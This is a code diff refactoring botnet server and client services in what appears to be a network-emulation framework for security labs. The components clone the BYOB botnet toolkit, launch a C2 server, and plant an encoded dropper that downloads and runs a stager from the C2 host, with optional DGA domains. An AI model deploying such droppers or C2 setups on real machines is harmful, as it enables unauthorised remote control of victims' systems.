@@ -56,23 +56,15 @@ class BotnetServer(Server):
     @brief The BotnetServer class.
     """
 
-    __node: Node
     __port: int
 
-    def __init__(self, node: Node):
+    def __init__(self):
         """!
         @brief BotnetServer constructor.
 
         @param node node.
         """
-        asn = node.getAsn()
-        self.__node = node
         self.__port = 445
-        try:
-            self.__ip = format(self.__node.getInterfaces()[0].getAddress())
-        except IndexError:
-            print("The Botnet server node has not joined any network, please assign an IP address first.")
-            raise
 
     def setPort(self, port: int):
         """!
@@ -83,53 +75,36 @@ class BotnetServer(Server):
         ## ! todo, not support to change port right now
         self.__port = port
 
-
-    def install(self):
+    def install(self, node: Node):
         """!
         @brief Install the Botnet C2 server.
         """
-        self.__node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip')
-        self.__node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')
-        # self.__node.addBuildCommand('curl https://bootstrap.pypa.io/get-pip.py -o /tmp/get-pip.py')
-        # self.__node.addBuildCommand('python2 /tmp/get-pip.py')
-        self.__node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')
-        self.__node.setFile('/tmp/byob/byob/modules/payloads/b6H.py', BotnetServerFileTemplates['payload'].replace("{serverHost}", self.__ip))
-        self.__node.setFile('/tmp/byob/byob/modules/stagers/b6H.py', BotnetServerFileTemplates['stager'].replace("{serverHost}", self.__ip))
-        self.__node.addStartCommand('cd /tmp/byob/byob/; echo "exit\ny" | python3 server.py --port {} &'.format(self.__port))
+        address = str(node.getInterfaces()[0].getAddress())
+
+        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip')
+        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')
+        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')
+        node.setFile('/tmp/byob/byob/modules/payloads/b6H.py', BotnetServerFileTemplates['payload'].replace("{serverHost}", address))
+        node.setFile('/tmp/byob/byob/modules/stagers/b6H.py', BotnetServerFileTemplates['stager'].replace("{serverHost}", address))
+        node.addStartCommand('cd /tmp/byob/byob/; echo "exit\ny" | python3 server.py --port {} &'.format(self.__port))
 
     def print(self, indent: int) -> str:
         out = ' ' * indent
-        out += 'BotnetServer: as{}/{}\n'.format(self.__node.getAsn(), self.__node.getName())
+        out += 'BotnetServer'
 
         return out
 
-class BotnetClient(Server):
+class BotnetClientServer(Server):
     """!
-    @brief The BotnetClient class.
+    @brief The BotnetClientServer class.
     """
 
-    __node: Node
     __port: int
 
-    def __init__(self, node: Node, C2ServerIp, dga=None):
+    def __init__(self):
         """!
         @brief BotnetClient constructor.
-
-        @:param node node.
-        @:param C2ServerIp use for connecting C2 server
-        @:param dga DGA function, used for generating multiple random C2 domains.
         """
-        self.__c2_server_url = 'http://'+C2ServerIp+':446//stagers/b6H.py'
-        self.__c2_server_ip = C2ServerIp
-        if dga is None:
-            self.__dropper = BotnetServerFileTemplates['dropper']\
-                        .format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()"
-                                                                      .format(repr(self.__c2_server_url)),2)))))
-        else:
-            dga_source_code = inspect.getsource(dga)
-            self.__dropper = BotnetServerFileTemplates['dga_dropper'].format(dga=dga_source_code)
-        asn = node.getAsn()
-        self.__node = node
         self.__port = 445
 
     def setPort(self, port: int):
@@ -141,81 +116,83 @@ class BotnetClient(Server):
         ## ! todo, not support to change port right now
         self.__port = port
 
-    def install(self):
+    def setServer(self, c2_server: str, dga = None):
+        """!
+        @brief BotnetClient constructor.
+
+        @param node node.
+        @param c2_server C2 server address.
+        @param dga DGA function, used for generating multiple random C2 domains.
+        """
+        self.__c2_server_url = 'http://{}:446//stagers/b6H.py'.format(c2_server)
+        self.__c2_server_ip = c2_server
+
+        if dga is None:
+            self.__dropper = BotnetServerFileTemplates['dropper']\
+                        .format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()"
+                                                                      .format(repr(self.__c2_server_url)),2)))))
+        else:
+            dga_source_code = inspect.getsource(dga)
+            self.__dropper = BotnetServerFileTemplates['dga_dropper'].format(dga = dga_source_code)
+
+    def install(self, node: Node):
         """!
         @brief Install the service.
         """
-        self.__node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip')
-        self.__node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')
+        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip')
+        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')
         # self.__node.addBuildCommand('curl https://bootstrap.pypa.io/get-pip.py -o /tmp/get-pip.py')
         # self.__node.addBuildCommand('python2 /tmp/get-pip.py')
-        self.__node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')
-        self.__node.setFile('/tmp/BotClient.py', self.__dropper)
-        self.__node.addStartCommand(BotnetServerFileTemplates['start_command'].format(C2ServerIp = self.__c2_server_ip))
+        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')
+        node.setFile('/tmp/BotClient.py', self.__dropper)
+        node.addStartCommand(BotnetServerFileTemplates['start_command'].format(C2ServerIp = self.__c2_server_ip))
 
     def print(self, indent: int) -> str:
         out = ' ' * indent
-        out += 'BotnetClient: as{}/{}\n'.format(self.__node.getAsn(), self.__node.getName())
+        out += 'BotnetClient'
 
         return out
 
 class BotnetService(Service):
     """!
-    @brief The BotnetService class.
+    @brief Botnet C2 server service.
     """
-
-    __servers: List[BotnetServer]
 
     def __init__(self):
         """!
         @brief BotnetService constructor.
         """
-        self.__servers = []
+        super().__init__()
         self.addDependency('Base', False, False)
+
+    def _createServer(self) -> Server:
+        return BotnetServer()
 
     def getName(self) -> str:
         return 'BotnetService'
 
-    def installC2(self, node: Node) -> BotnetServer:
+    def print(self, indent: int) -> str:
+        out = ' ' * indent
+        out += 'BotnetServiceLayer\n'
+
+class BotnetClientService(Service):
+    """!
+    @brief Botnet client service.
+    """
+
+    def __init__(self):
         """!
-        @brif install C2 server to node
-        @:param node, the node of attacker
+        @brief BotnetService constructor.
         """
-        server: BotnetServer = node.getAttribute('__botnet_service_server')
-        if server != None: return server
-        server = BotnetServer(node)
-        self.__servers.append(server)
-        node.setAttribute('__botnet_service_server', server)
-        return server
+        super().__init__()
+        self.addDependency('Base', False, False)
 
-    def installBot(self, node: Node, C2ServerIp, dga=None) -> BotnetClient:
-        """!
-        @brif install bot client to node
-        @:param node, the node of victim or bot
-        @:param C2ServerIp, the IP of C2 server
-        """
-        server: BotnetClient = node.getAttribute('__botnet_service_client')
-        if server != None: return server
-        server = BotnetClient(node, C2ServerIp, dga)
-        self.__servers.append(server)
-        node.setAttribute('__botnet_service_client', server)
-        return server
+    def _createServer(self) -> Server:
+        return BotnetClientServer()
 
-
-    def onRender(self):
-        for server in self.__servers:
-            server.install()
+    def getName(self) -> str:
+        return 'BotnetClientService'
 
     def print(self, indent: int) -> str:
         out = ' ' * indent
-        out += 'BotnetServiceLayer:\n'
-
-        indent += 4
-        out += ' ' * indent
-
-        out += 'Installed Nodes:\n'
-
-        for server in self.__servers:
-            out += server.print(indent + 4)
-
-        return out
+        out += 'BotnetClientServiceLayer\n'
